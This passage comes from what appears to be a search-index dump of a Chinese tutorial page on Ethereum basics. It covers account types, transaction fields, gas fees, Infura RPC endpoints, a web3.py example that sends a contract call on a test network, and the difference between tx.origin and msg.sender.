\u00b6 \u5916\u90e8\u8d26\u6237\u662f\u7531\u4eba\u521b\u5efa\u7684\uff0c\u53ef\u4ee5\u5b58\u50a8\u4ee5\u592a\u5e01\uff0c\u662f\u7531\u516c\u94a5\u548c\u79c1\u94a5\u63a7\u5236\u7684\u8d26\u6237\u3002\u6bcf\u4e2a\u5916\u90e8\u8d26\u6237\u62e5\u6709\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u8fd9\u5bf9\u5bc6\u94a5\u7528\u4e8e\u7b7e\u7f72\u4ea4\u6613\uff0c\u5b83\u7684\u5730\u5740\u7531\u516c\u94a5\u51b3\u5b9a\u3002\u5916\u90e8\u8d26\u6237\u4e0d\u80fd\u5305\u542b\u4ee5\u592a\u574a\u865a\u62df\u673a\uff08EVM\uff09\u4ee3\u7801\u3002 \u4e00\u4e2a\u5916\u90e8\u8d26\u6237\u5177\u6709\u4ee5\u4e0b\u7279\u6027 \u62e5\u6709\u4e00\u5b9a\u7684 Ether \u53ef\u4ee5\u53d1\u9001\u4ea4\u6613\u3001\u901a\u8fc7\u79c1\u94a5\u63a7\u5236 \u6ca1\u6709\u76f8\u5173\u8054\u7684\u4ee3\u7801 \u5408\u7ea6\u8d26\u6237 \u00b6 \u5408\u7ea6\u8d26\u6237\u662f\u7531\u5916\u90e8\u8d26\u6237\u521b\u5efa\u7684\u8d26\u6237\uff0c\u5305\u542b\u5408\u7ea6\u4ee3\u7801\u3002\u5408\u7ea6\u8d26\u6237\u7684\u5730\u5740\u662f\u7531\u5408\u7ea6\u521b\u5efa\u65f6\u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\uff0c\u4ee5\u53ca\u8be5\u5730\u5740\u53d1\u51fa\u7684\u4ea4\u6613\u5171\u540c\u8ba1\u7b97\u5f97\u51fa\u7684\u3002 \u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u5177\u6709\u4ee5\u4e0b\u7279\u6027 \u62e5\u6709\u4e00\u5b9a\u7684 Ether \u6709\u76f8\u5173\u8054\u7684\u4ee3\u7801\uff0c\u4ee3\u7801\u901a\u8fc7\u4ea4\u6613\u6216\u8005\u5176\u4ed6\u5408\u7ea6\u53d1\u9001\u7684\u8c03\u7528\u6765\u6fc0\u6d3b \u5f53\u5408\u7ea6\u88ab\u6267\u884c\u65f6\uff0c\u53ea\u80fd\u64cd\u4f5c\u5408\u7ea6\u8d26\u6237\u62e5\u6709\u7684\u7279\u5b9a\u5b58\u50a8 Note \u79c1\u94a5\u7ecf\u8fc7\u4e00\u79cd\u54c8\u5e0c\u7b97\u6cd5(\u692d\u5706\u66f2\u7ebf\u7b97\u6cd5 ECDSA-secp256k1 )\u8ba1\u7b97\u751f\u6210\u516c\u94a5\uff0c\u8ba1\u7b97\u516c\u94a5\u7684 Keccak-256 \u54c8\u5e0c\u503c\uff0c\u7136\u540e\u53d6\u6700\u540e 160 \u4f4d\u4e8c\u8fdb\u5236\uff08\u901a\u5e38\u8868\u73b0\u4e3a 40 \u4f4d\u7684 16 \u8fdb\u5236\u5b57\u7b26\u4e32\uff09\u5f62\u6210\u4e86\u5730\u5740\u3002\u5176\u4e2d\uff0c\u516c\u94a5\u548c\u5730\u5740\u90fd\u662f\u53ef\u4ee5\u516c\u5e03\u7684\uff0c\u800c\u79c1\u94a5\uff0c\u4f60\u53ea\u80fd\u81ea\u5df1\u6084\u6084\u7684\u85cf\u8d77\u6765\uff0c\u4e0d\u8981\u4e22\u5931\uff0c\u56e0\u4e3a\u4f60\u7684\u8d26\u6237\u4e2d\u7684\u8d44\u4ea7\u4e5f\u4f1a\u8ddf\u7740\u4e22\u6389\uff1b\u4e0d\u8981\u88ab\u522b\u4eba\u76d7\u53d6\uff0c\u56e0\u4e3a\u8d26\u6237\u4e2d\u7684\u8d44\u4ea7\u4e5f\u4f1a\u968f\u7740\u88ab\u76d7\u53d6\u3002\u6240\u4ee5\uff0c\u79c1\u94a5\u7684\u4fdd\u5b58\u975e\u5e38\u91cd\u8981\u3002 \u4ee5\u592a\u574a\u4e2d\uff0c\u8fd9\u4e24\u79cd\u8d26\u6237\u7edf\u79f0\u4e3a\u201c\u72b6\u6001\u5bf9\u8c61\u201d\uff08\u5b58\u50a8\u72b6\u6001\uff09\u3002\u5176\u4e2d\u5916\u90e8\u8d26\u6237\u5b58\u50a8\u4ee5\u592a\u5e01\u4f59\u989d\u72b6\u6001\uff0c\u800c\u5408\u7ea6\u8d26\u6237\u9664\u4e86\u4f59\u989d\u8fd8\u6709\u667a\u80fd\u5408\u7ea6\u53ca\u5176\u53d8\u91cf\u7684\u72b6\u6001\u3002\u901a\u8fc7\u4ea4\u6613\u7684\u6267\u884c\uff0c\u8fd9\u4e9b\u72b6\u6001\u5bf9\u8c61\u53d1\u751f\u53d8\u5316\uff0c\u800c Merkle \u6811\u7528\u4e8e\u7d22\u5f15\u548c\u9a8c\u8bc1\u72b6\u6001\u5bf9\u8c61\u7684\u66f4\u65b0\u3002\u4e00\u4e2a\u4ee5\u592a\u574a\u7684\u8d26\u6237\u5305\u542b 4 \u4e2a\u90e8\u5206\uff1a nonce: \u5df2\u6267\u884c\u4ea4\u6613\u603b\u6570\uff0c\u7528\u6765\u6807\u793a\u8be5\u8d26\u6237\u53d1\u51fa\u7684\u4ea4\u6613\u6570\u91cf\u3002 balance: \u8d26\u6301\u5e01\u6570\u91cf\uff0c\u8bb0\u5f55\u8d26\u6237\u7684\u4ee5\u592a\u5e01\u4f59\u989d\u3002 storageRoot: \u5b58\u50a8\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u667a\u80fd\u5408\u7ea6\u8d26\u6237\u7684\u5b58\u50a8\u6570\u636e\u533a\u3002 codeHash: \u4ee3\u7801\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u667a\u80fd\u5408\u7ea6\u8d26\u6237\u5b58\u50a8\u7684\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u3002 \u4e24\u4e2a\u5916\u90e8\u8d26\u6237\u4e4b\u95f4\u7684\u4ea4\u6613\u53ea\u662f\u4e00\u4e2a\u4ef7\u503c\u8f6c\u79fb\u3002\u4f46\u662f\u4ece\u5916\u90e8\u8d26\u6237\u5230\u5408\u7ea6\u8d26\u6237\u7684\u4ea4\u6613\u4f1a\u6fc0\u6d3b\u5408\u7ea6\u8d26\u6237\u7684\u4ee3\u7801\uff0c\u5141\u8bb8\u5b83\u6267\u884c\u5404\u79cd\u64cd\u4f5c\uff08\u4f8b\u5982\u8f6c\u79fb Token\uff0c\u5199\u5165\u5185\u90e8\u5b58\u50a8\uff0c\u521b\u5efa\u65b0\u7684 Token \uff0c\u6267\u884c\u4e00\u4e9b\u8ba1\u7b97\uff0c\u521b\u5efa\u65b0\u7684\u5408\u7ea6\u7b49\uff09\u3002 \u4e0e\u5916\u90e8\u8d26\u6237\u4e0d\u540c\uff0c\u5408\u7ea6\u8d26\u6237\u4e0d\u80fd\u81ea\u884c\u53d1\u8d77\u65b0\u7684\u4ea4\u6613\u3002\u76f8\u53cd\uff0c\u5408\u7ea6\u5e10\u6237\u53ea\u80fd\u89e6\u53d1\u4ea4\u6613\u4ee5\u54cd\u5e94\u5176\u4ed6\u4ea4\u6613\uff08\u4ece\u5916\u90e8\u62e5\u6709\u7684\u5e10\u6237\u6216\u5176\u4ed6\u5408\u7ea6\u5e10\u6237\uff09\u3002 Note \u6ce8\uff1a\u5408\u7ea6\u8d26\u6237\u548c\u5916\u90e8\u8d26\u6237\u6700\u5927\u7684\u4e0d\u540c\u5c31\u662f\u5b83\u8fd8\u5b58\u6709\u667a\u80fd\u5408\u7ea6\u3002 \u4ea4\u6613 \u00b6 \u4ee5\u592a\u574a\u7684\u4ea4\u6613\u4e3b\u8981\u662f\u6307\u4e00\u6761\u5916\u90e8\u8d26\u6237\u53d1\u9001\u5230\u533a\u5757\u94fe\u4e0a\u53e6\u4e00\u8d26\u6237\u7684\u6d88\u606f\u7684\u7b7e\u540d\u6570\u636e\u5305\uff0c\u5176\u4e3b\u8981\u5305\u542b\u53d1\u9001\u8005\u7684\u7b7e\u540d\u3001\u63a5\u6536\u8005\u7684\u5730\u5740\u4ee5\u53ca\u53d1\u9001\u8005\u8f6c\u79fb\u7ed9\u63a5\u6536\u8005\u7684\u4ee5\u592a\u5e01\u6570\u91cf\u7b49\u5185\u5bb9\u3002\u4ee5\u592a\u574a\u4e0a\u7684\u6bcf\u4e00\u7b14\u4ea4\u6613\u90fd\u9700\u8981\u652f\u4ed8\u4e00\u5b9a\u7684\u8d39\u7528\uff0c\u7528\u4e8e\u652f\u4ed8\u4ea4\u6613\u6267\u884c\u6240\u9700\u8981\u7684\u8ba1\u7b97\u5f00\u9500\u3002\u8ba1\u7b97\u5f00\u9500\u7684\u8d39\u7528\u5e76\u4e0d\u662f\u4ee5\u592a\u5e01\u76f4\u63a5\u8ba1\u7b97\u7684\uff0c\u800c\u662f\u5f15\u5165 Gas \u4f5c\u4e3a\u6267\u884c\u5f00\u9500\u7684\u57fa\u672c\u5355\u4f4d\uff0c\u901a\u8fc7 GasPrice \u4e0e\u4ee5\u592a\u5e01\u8fdb\u884c\u6362\u7b97\u7684\u3002 GasPrice \u6839\u636e\u5e02\u573a\u6ce2\u52a8\u8c03\u6574\uff0c\u907f\u514d\u4ee5\u592a\u5e01\u4ef7\u503c\u53d7\u5e02\u573a\u4ef7\u683c\u7684\u5f71\u54cd\u3002\u4ea4\u6613\u662f\u4ee5\u592a\u574a\u6574\u4f53\u7ed3\u6784\u4e2d\u7684\u91cd\u8981\u90e8\u5206\uff0c\u5b83\u5c06\u4ee5\u592a\u574a\u7684\u8d26\u6237\u8fde\u63a5\u8d77\u6765\uff0c\u8d77\u5230\u4ef7\u503c\u7684\u4f20\u9012\u4f5c\u7528\u3002 \u4ea4\u6613\u8d39\u7528 \u00b6 Gas: \u8861\u91cf\u4e00\u7b14\u4ea4\u6613\u6240\u6d88\u8017\u7684\u8ba1\u7b97\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d Gas Price: \u4e00\u5355\u4f4d Gas \u6240\u9700\u7684\u624b\u7eed\u8d39\uff08Ether\uff09 Gas Limit: \u4ea4\u6613\u53d1\u9001\u8005\u613f\u610f\u4e3a\u8fd9\u7b14\u4ea4\u6613\u6267\u884c\u6240\u652f\u4ed8\u7684\u6700\u5927 Gas \u6570\u91cf Note \u6ce8\uff1a\u5982\u679c\u4ea4\u6613\u5b9e\u9645\u6d88\u8017\u7684 Gas (Gas Used) \u5c0f\u4e8e Gas Limit, \u90a3\u4e48\u6267\u884c\u7684\u77ff\u5de5\u53ea\u4f1a\u6536\u53d6\u5b9e\u9645\u8ba1\u7b97\u5f00\u9500\uff08Gas Used\uff09\u5bf9\u5e94\u7684\u4ea4\u6613\u624b\u7eed\u8d39\uff08Gas Used * Gas Price\uff09\uff1b\u800c\u5982\u679c Gas Used \u5927\u4e8e Gas Limit\uff0c\u90a3\u4e48\u77ff\u5de5\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u53d1\u73b0 Gas \u5df2\u88ab\u8017\u5c3d\u800c\u4ea4\u6613\u6ca1\u6709\u6267\u884c\u5b8c\u6210\uff0c\u6b64\u65f6\u77ff\u5de5\u4f1a\u56de\u6eda\u5230\u7a0b\u5e8f\u6267\u884c\u524d\u5230\u72b6\u6001\uff0c\u800c\u4e14\u6536\u53d6 Gas Limit \u6240\u5bf9\u5e94\u7684\u624b\u7eed\u8d39\uff08GasPrice * Gas Limit\uff09\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c GasPrice * Gas Limit \u8868\u793a\u7528\u6237\u613f\u610f\u4e3a\u4e00\u7b14\u4ea4\u6613\u652f\u4ed8\u7684\u6700\u9ad8\u91d1\u989d\u3002 \u4ea4\u6613\u5185\u5bb9 \u00b6 \u4ee5\u592a\u574a\u4e2d\u7684\u4ea4\u6613\uff08Transaction\uff09\u662f\u6307\u5b58\u50a8\u4e00\u6761\u4ece\u5916\u90e8\u8d26\u6237\u53d1\u9001\u5230\u533a\u5757\u94fe\u4e0a\u53e6\u4e00\u4e2a\u8d26\u6237\u7684\u6d88\u606f\u7684\u7b7e\u540d\u6570\u636e\u5305\uff0c\u5b83\u65e2\u53ef\u4ee5\u662f\u7b80\u5355\u7684\u8f6c\u8d26\uff0c\u4e5f\u53ef\u4ee5\u662f\u5305\u542b\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u7684\u6d88\u606f\u3002\u4e00\u6761\u4ea4\u6613\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a from: \u4ea4\u6613\u53d1\u9001\u8005\u7684\u5730\u5740\uff0c\u5fc5\u586b\uff1b to: \u4ea4\u6613\u63a5\u6536\u8005\u7684\u5730\u5740\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u610f\u5473\u8fd9\u662f\u4e00\u4e2a\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u7684\u4ea4\u6613\uff1b value: \u53d1\u9001\u8005\u8981\u8f6c\u79fb\u7ed9\u63a5\u6536\u8005\u7684\u4ee5\u592a\u5e01\u6570\u91cf data: \u5b58\u5728\u7684\u6570\u636e\u5b57\u6bb5\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u8868\u660e\u8be5\u4ea4\u6613\u662f\u4e00\u4e2a\u521b\u5efa\u6216\u8005\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u7684\u4ea4\u6613\uff1b Gas Limit: \u8868\u793a\u4ea4\u6613\u5141\u8bb8\u6d88\u8017\u7684\u6700\u5927 Gas \u6570\u91cf\uff1b GasPrice: \u53d1\u9001\u8005\u613f\u610f\u652f\u4ed8\u7ed9\u77ff\u5de5\u7684 Gas \u5355\u4ef7\uff1b nonce: \u7528\u6765\u533a\u522b\u540c\u4e00\u8d26\u6237\u53d1\u51fa\u7684\u4e0d\u540c\u4ea4\u6613\u7684\u6807\u8bb0\uff1b hash: \u7531\u4ee5\u4e0a\u4fe1\u606f\u751f\u6210\u7684\u6563\u5217\u503c\uff08\u54c8\u5e0c\u503c\uff09\uff1b r\u3001s\u3001v: \u4ea4\u6613\u7b7e\u540d\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u7531\u53d1\u9001\u8005\u7684\u79c1\u94a5\u5bf9\u4ea4\u6613 hash \u8fdb\u884c\u7b7e\u540d\u751f\u6210\u3002 \u4ee5\u4e0a\u662f\u4ee5\u592a\u574a\u4e2d\u4ea4\u6613\u53ef\u80fd\u5305\u542b\u7684\u5185\u5bb9\uff0c\u5728\u4e0d\u540c\u573a\u666f\u4e0b\uff0c\u4ea4\u6613\u6709\u4e09\u79cd\u7c7b\u578b\u3002 \u8f6c\u5e10\u4ea4\u6613 \u8f6c\u8d26\u662f\u6700\u7b80\u5355\u7684\u4e00\u79cd\u4ea4\u6613\uff0c\u4ece\u4e00\u4e2a\u8d26\u6237\u5411\u53e6\u4e00\u4e2a\u8d26\u6237\u53d1\u9001 Ether\uff0c\u53d1\u9001\u8f6c\u8d26\u4ea4\u6613\u65f6\u53ea\u9700\u8981\u6307\u5b9a\u4ea4\u6613\u7684\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8f6c\u79fb\u7684 Ether \u6570\u91cf\u5373\u53ef\uff08\u5728\u5ba2\u6237\u7aef\u53d1\u9001\u4ea4\u6613\u65f6\uff0cGas Limit\u3001Gas Price\u3001nonce\u3001hash\u3001\u7b7e\u540d\u53ef\u4ee5\u6309\u7167\u9ed8\u8ba4\u65b9\u5f0f\u751f\u6210\uff09\uff0c\u5982\u4e0b\u6240\u793a web3.eth.sendTransaction({ from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\", to: \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\", value: 1000 }) \u521b\u5efa\u5408\u7ea6\u7684\u4ea4\u6613 \u521b\u5efa\u5408\u7ea6\u662f\u6307\u5c06\u5408\u7ea6\u90e8\u7f72\u5230\u533a\u5757\u94fe\u4e0a\uff0c\u8fd9\u4e5f\u662f\u901a\u8fc7\u4ea4\u6613\u6765\u5b8c\u6210\u7684\u3002\u521b\u5efa\u5408\u7ea6\u65f6\uff0cto \u5b57\u6bb5\u662f\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\uff0cdata \u5b57\u6bb5\u662f\u5408\u7ea6\u7f16\u8bd1\u540e\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff0c\u5728\u4e4b\u540e\u5408\u7ea6\u88ab\u8c03\u7528\u65f6\uff0c\u8be5\u4ee3\u7801\u7684\u6267\u884c\u7ed3\u679c\u5c06\u4f5c\u4e3a\u5408\u7ea6\u4ee3\u7801\uff0c\u5982\u4e0b\u6240\u793a web3.eth.sendTransaction({ from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\", data: \"contract binary code\" }) \u6267\u884c\u5408\u7ea6\u7684\u4ea4\u6613 \u8be5\u4ea4\u6613\u4e2d\uff0cto \u5b57\u6bb5\u662f\u8981\u8c03\u7528\u7684\u667a\u80fd\u5408\u7ea6\u7684\u5730\u5740\uff0c\u901a\u8fc7 data \u5b57\u6bb5\u6307\u5b9a\u8981\u8c03\u7528\u7684\u65b9\u6cd5\u4ee5\u53ca\u5411\u8be5\u65b9\u6cd5\u4f20\u5165\u53c2\u6570\uff0c\u5982\u4e0b\u6240\u793a web3.eth.sendTransaction({ from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\", to: \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\", data: \"hash of the invoked method signature and encoded parameters\" }) Info \u6839\u636e to\u3001data \u5b57\u6bb5\u5185\u5bb9\u4e5f\u53ef\u4ee5\u53cd\u8fc7\u6765\u5224\u65ad\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u4ea4\u6613\uff0c\u7136\u540e\u53ef\u4ee5\u7ee7\u7eed\u5206\u6790\u3002 Interact with Contracts \u00b6 \u76f4\u63a5\u901a\u8fc7 Remix \u4ea4\u4e92 Remix \u4e0d\u80fd\u591f\u505a\u5230\u81ea\u52a8\u5316\uff0c\u6240\u4ee5\u4fbf\u6709\u5f00\u53d1\u4eba\u5458\u505a\u4e86\u4e00\u4e9b\u5de5\u4f5c Python \u7684 web3.py \u5e93 Nodejs \u7684 web3.js \u5e93 Infura \u63d0\u4f9b\u4e86 RPC API \u4f9b\u5f00\u53d1\u8005\u8c03\u7528\uff0c\u73b0\u652f\u6301 Ethereum\u3001Eth2\u3001Filecoin \u4f7f\u7528 Infura \u63d0\u4f9b\u7684 RPC API\uff0c\u5229\u7528 web3.py \u6216\u8005 web3.js \u5e93\u4e0e\u5176\u8fdb\u884c\u81ea\u52a8\u5316\u4ea4\u4e92 Infura \u73b0\u652f\u6301\u5982\u4e0b\u7f51\u7edc\u7684\u8bbf\u95ee\u70b9\uff1a \u7f51\u7edc \u8bf4\u660e URL Mainnet JSON-RPC over HTTPs https://mainnet.infura.io/v3/YOUR-PROJECT-ID Mainnet JSON-RPC over websockets wss://mainnet.infura.io/ws/v3/YOUR-PROJECT-ID Ropsten JSON-RPC over HTTPs https://ropsten.infura.io/v3/YOUR-PROJECT-ID Ropsten JSON-RPC over websockets wss://ropsten.infura.io/ws/v3/YOUR-PROJECT-ID Rinkeby JSON-RPC over HTTPs https://rinkeby.infura.io/v3/YOUR-PROJECT-ID Rinkeby JSON-RPC over websockets wss://rinkeby.infura.io/ws/v3/YOUR-PROJECT-ID Kovan JSON-RPC over HTTPs https://kovan.infura.io/v3/YOUR-PROJECT-ID Kovan JSON-RPC over websockets wss://kovan.infura.io/ws/v3/YOUR-PROJECT-ID G\u00f6rli JSON-RPC over HTTPs https://goerli.infura.io/v3/YOUR-PROJECT-ID G\u00f6rli JSON-RPC over websockets wss://goerli.infura.io/ws/v3/YOUR-PROJECT-ID Mainnet(eth2) JSON-RPC over HTTPs https://YOUR-PROJECT-ID:YOUR-PROJECT-SECRET@eth2-beacon-mainnet.infura.io pyrmont(eth2) JSON-RPC over websockets wss://YOUR-PROJECT-ID: YOUR-PROJECT-SECRET@eth2-beacon-mainnet.infura.io Filecoin JSON-RPC over HTTPs https://YOUR-PROJECT-ID:YOUR-PROJECT-SECRET@filecoin.infura.io Filecoin JSON-RPC over websockets wss://YOUR-PROJECT-ID: YOUR-PROJECT-SECRET@filecoin.infura.io Note \u6ce8\uff1a\u4f7f\u7528\u65f6\uff0c\u8bf7\u52a1\u5fc5\u4f7f\u7528\u4f60\u7684Infura\u4eea\u8868\u76d8 \u4e2d\u7684\u9879\u76ee ID/Project ID \u6216 Project Secret \u6765\u66ff\u6362\u4ee5\u4e0a URL \u4e2d\u7684 YOUR-PROJECT-ID \u6216 YOUR-PROJECT-SECRET \u4e0b\u9762\u662f\u4f7f\u7528 web3.py \u548c Infura API \u4e0e\u667a\u80fd\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92\u8c03\u7528\u5408\u7ea6\u51fd\u6570\u9009\u62e9\u5668\u4e3a 0x00774360 \u7684\u51fd\u6570\u7684\u4f8b\u5b50 from web3 import Web3 , HTTPProvider w3 = Web3 ( Web3 . HTTPProvider ( \"https://rinkeby.infura.io/v3/YOUR-PROJECT-ID\" )) contract_address = \"0x31c883a9aa588d3f890c26c7844062d99444b5d6\" private = \"your private key\" public = \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\" def deploy ( public ): txn = { 'from' : Web3 . toChecksumAddress ( public ), 'to' : Web3 . toChecksumAddress ( contract_address ), 'gasPrice' : w3 . eth . gasPrice , 'gas' : 3000000 , 'nonce' : w3 . eth . getTransactionCount ( Web3 . toChecksumAddress ( public )), 'value' : Web3 . toWei ( 0 , 'ether' ), 'data' : '0x007743600000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000001a6100016100016100016100016100016100650361000161fbfbf1000000000000' , } signed_txn = w3 . eth . account . signTransaction ( txn , private ) txn_hash = w3 . eth . sendRawTransaction ( signed_txn . rawTransaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( \"txn_hash=\" , txn_hash ) return txn_receipt print ( deploy ( public )) tx.origin vs msg.sender \u00b6 \u8fd9\u91cc\u533a\u5206\u4e00\u4e0b tx.origin \u548c msg.sender \uff0cmsg.sender \u662f\u51fd\u6570\u7684\u76f4\u63a5\u8c03\u7528\u65b9\uff0c\u5728\u7528\u6237\u624b\u52a8\u8c03\u7528\u8be5\u51fd\u6570\u65f6\u662f\u53d1\u8d77\u4ea4\u6613\u7684\u8d26\u6237\u5730\u5740\uff0c\u4f46\u4e5f\u53ef\u4ee5\u662f\u8c03\u7528\u8be5\u51fd\u6570\u7684\u4e00\u4e2a\u667a\u80fd\u5408\u7ea6\u7684\u5730\u5740\u3002\u800c tx.origin \u5219\u5fc5\u7136\u662f\u8fd9\u4e2a\u4ea4\u6613\u7684\u539f\u59cb\u53d1\u8d77\u65b9\uff0c\u65e0\u8bba\u4e2d\u95f4\u6709\u591a\u5c11\u6b21\u5408\u7ea6\u5185/\u8de8\u5408\u7ea6\u51fd\u6570\u8c03\u7528\uff0c\u800c\u4e14\u4e00\u5b9a\u662f\u8d26\u6237\u5730\u5740\u800c\u4e0d\u662f\u5408\u7ea6\u5730\u5740\u3002 \u7ed9\u5b9a\u8fd9\u6837\u4e00\u4e2a\u573a\u666f\u5982\uff1a\u7528\u6237\u901a\u8fc7\u5408\u7ea6 A \u8c03\u5408\u7ea6B\uff0c\u6b64\u65f6\uff1a \u5bf9\u4e8e\u5408\u7ea6 A : tx.origin \u548c msg.sender \u90fd\u662f\u7528\u6237 \u5bf9\u4e8e\u5408\u7ea6 B : tx.origin \u662f\u7528\u6237\uff0cmsg.sender \u662f\u5408\u7ea6 A","title":"Ethereum Basics"},{"location":"blockchain/ethereum/basics/#ethereum-basics","text":"\u5bf9\u667a\u80fd\u5408\u7ea6\u4e00\u4e9b\u57fa\u7840\u77e5\u8bc6\u7684\u4ecb\u7ecd\u3002","title":"Ethereum Basics"},{"location":"blockchain/ethereum/basics/#solidity","text":"Solidity is an object-oriented programming language for writing smart contracts. It is used for implementing smart contracts on various blockchain platforms, most notably, Ethereum. It was developed by Christian Reitwiessner, Alex Beregszaszi, and several former Ethereum core contributors to enable writing smart contracts on blockchain platforms such as Ethereum. ------ from wikipedia Solidity \u662f\u4e00\u79cd\u7528\u4e8e\u7f16\u5199\u667a\u80fd\u5408\u7ea6\u7684\u9ad8\u7ea7\u8bed\u8a00\uff0c\u8bed\u6cd5\u7c7b\u4f3c\u4e8e JavaScript\u3002\u5728\u4ee5\u592a\u574a\u5e73\u53f0\u4e0a\uff0cSolidity \u7f16\u5199\u7684\u667a\u80fd\u5408\u7ea6\u53ef\u4ee5\u88ab\u7f16\u8bd1\u6210\u5b57\u8282\u7801\u5728\u4ee5\u592a\u574a\u865a\u62df\u673a EVM \u4e0a\u8fd0\u884c\u3002 \u53ef\u53c2\u8003 \u5b98\u65b9\u7f51\u7ad9 \u8fdb\u884c\u5b66\u4e60\uff0c\u4e0d\u518d\u5c55\u5f00\u4ecb\u7ecd\u3002","title":"Solidity"},{"location":"blockchain/ethereum/basics/#metamask","text":"\u975e\u5e38\u597d\u7528\u4e5f\u662f\u7528\u7684\u6700\u591a\u7684\u4ee5\u592a\u574a\u94b1\u5305\uff0c\u5934\u50cf\u662f\u5c0f\u72d0\u72f8\u6807\u8bc6\uff0cChrome \u63d0\u4f9b\u4e86\u5176\u63d2\u4ef6\uff0c\u5176\u4e0d\u4ec5\u53ef\u4ee5\u7ba1\u7406\u5916\u90e8\u8d26\u6237\uff0c\u800c\u4e14\u53ef\u4ee5\u4fbf\u6377\u5207\u6362\u6d4b\u8bd5\u94fe\u7f51\u7edc\uff0c\u5e76\u4e14\u53ef\u4ee5\u81ea\u5b9a\u4e49 RPC \u7f51\u7edc\u3002 Info \u4e00\u4e2a\u5916\u90e8\u8d26\u6237\u901a\u5e38\u7531\u79c1\u94a5\u6587\u4ef6\u63a7\u5236\uff0c\u62e5\u6709\u79c1\u94a5\u7684\u7528\u6237\u5c31\u53ef\u4ee5\u62e5\u6709\u5bf9\u5e94\u5730\u5740\u7684\u8d26\u6237\u91cc\u7684 Ether \u4f7f\u7528\u6743\u3002\u6211\u4eec\u901a\u5e38\u628a\u7ba1\u7406\u8fd9\u4e9b\u6570\u5b57\u5bc6\u94a5\u7684\u8f6f\u4ef6\u79f0\u4e3a\u94b1\u5305\uff0c\u800c\u6211\u4eec\u6240\u8bf4\u7684\u5907\u4efd\u94b1\u5305\u5176\u5b9e\u5c31\u662f\u5907\u4efd\u8d26\u6237\u7684\u79c1\u94a5\u6587\u4ef6\u3002","title":"MetaMask"},{"location":"blockchain/ethereum/basics/#remix","text":"\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684 Solidity \u7f16\u8bd1\u5668\u548c\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff0c\u63d0\u4f9b\u4e86\u4ea4\u4e92\u5f0f\u754c\u9762\uff0c\u4ee5\u53ca\u7f16\u8bd1\u3001\u8c03\u7528\u6d4b\u8bd5\u3001\u53d1\u5e03\u7b49\u4e00\u7cfb\u5217\u529f\u80fd\uff0c\u4f7f\u7528\u5341\u5206\u65b9\u4fbf\u3002 http://remix.ethereum.org/","title":"Remix"},{"location":"blockchain/ethereum/basics/#_1","text":"\u5728\u4ee5\u592a\u574a\u4e2d\uff0c\u4e00\u4e2a\u91cd\u8981\u7684\u6982\u5ff5\u5c31\u662f\u8d26\u6237\uff08Account\uff09\u3002 \u5728\u4ee5\u592a\u574a\u4e2d\u5b58\u5728\u4e24\u79cd\u7c7b\u578b\u7684\u8d26\u6237\uff0c\u5206\u522b\u662f\u5916\u90e8\u8d26\u6237\uff08Externally Owned Account, EOA\uff09\u548c\u5408\u7ea6\u8d26\u6237\u3002","title":"\u8d26\u6237"},{"location":"blockchain/ethereum/basics/#_2","text":"\u5916\u90e8\u8d26\u6237\u662f\u7531\u4eba\u521b\u5efa\u7684\uff0c\u53ef\u4ee5\u5b58\u50a8\u4ee5\u592a\u5e01\uff0c\u662f\u7531\u516c\u94a5\u548c\u79c1\u94a5\u63a7\u5236\u7684\u8d26\u6237\u3002\u6bcf\u4e2a\u5916\u90e8\u8d26\u6237\u62e5\u6709\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u8fd9\u5bf9\u5bc6\u94a5\u7528\u4e8e\u7b7e\u7f72\u4ea4\u6613\uff0c\u5b83\u7684\u5730\u5740\u7531\u516c\u94a5\u51b3\u5b9a\u3002\u5916\u90e8\u8d26\u6237\u4e0d\u80fd\u5305\u542b\u4ee5\u592a\u574a\u865a\u62df\u673a\uff08EVM\uff09\u4ee3\u7801\u3002 \u4e00\u4e2a\u5916\u90e8\u8d26\u6237\u5177\u6709\u4ee5\u4e0b\u7279\u6027 \u62e5\u6709\u4e00\u5b9a\u7684 Ether \u53ef\u4ee5\u53d1\u9001\u4ea4\u6613\u3001\u901a\u8fc7\u79c1\u94a5\u63a7\u5236 